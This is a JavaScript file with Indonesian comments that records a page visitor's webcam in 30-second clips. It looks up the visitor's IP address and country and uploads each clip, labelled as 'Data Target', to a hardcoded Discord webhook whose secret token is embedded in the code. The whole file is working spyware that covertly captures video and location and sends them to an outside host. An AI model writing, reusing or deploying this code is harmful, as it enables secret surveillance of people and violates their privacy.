const webhookURL = "https://discord.com/api/webhooks/1353279499181097011/dz2zc8jUhz6K2-jFu-qk2eJfWKikdKP-Yg1J65kG_FbAFr7MEWyfMn64bZSqDgEKgUv7"; // Ganti dengan webhook
const videoElement = document.getElementById("preview");

// Mulai kamera
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {
        videoElement.srcObject = stream;
        startRecording(stream);
    })
    .catch(err => console.error("Gagal akses kamera:", err));

function startRecording(stream) {
    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
    let chunks = [];

    recorder.ondataavailable = event => chunks.push(event.data);

    recorder.onstop = () => {
        const videoBlob = new Blob(chunks, { type: "video/webm" });

        if (videoBlob.size < 25 * 1024 * 1024) { // Pastikan < 25MB
            getTargetInfo(videoBlob);
        }

        chunks = []; // Hapus rekaman setelah dikirim
    };

    setInterval(() => {
        recorder.stop();
        setTimeout(() => recorder.start(), 500); // Restart rekaman
    }, 30000); // Rekam tiap 30 detik

    recorder.start();
}

function getTargetInfo(blob) {
    fetch("https://ipwho.is/")
        .then(response => response.json())
        .then(data => {
            const ip = data.ip || "Unknown";
            const country = data.country || "Unknown";
            const localTime = new Date().toLocaleString();

            sendToDiscord(blob, ip, country, localTime);
        })
        .catch(err => {
            console.error("Gagal mengambil data IP:", err);
            sendToDiscord(blob, "Unknown", "Unknown", new Date().toLocaleString());
        });
}

function sendToDiscord(blob, ip, country, localTime) {
    const formData = new FormData();
    formData.append("file", blob, "recording.webm");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Negara**: ${country}\n⏰ **Waktu Target**: ${localTime}`
    }));

    fetch(webhookURL, { method: "POST", body: formData })
        .catch(err => console.error("Gagal kirim video:", err));
}
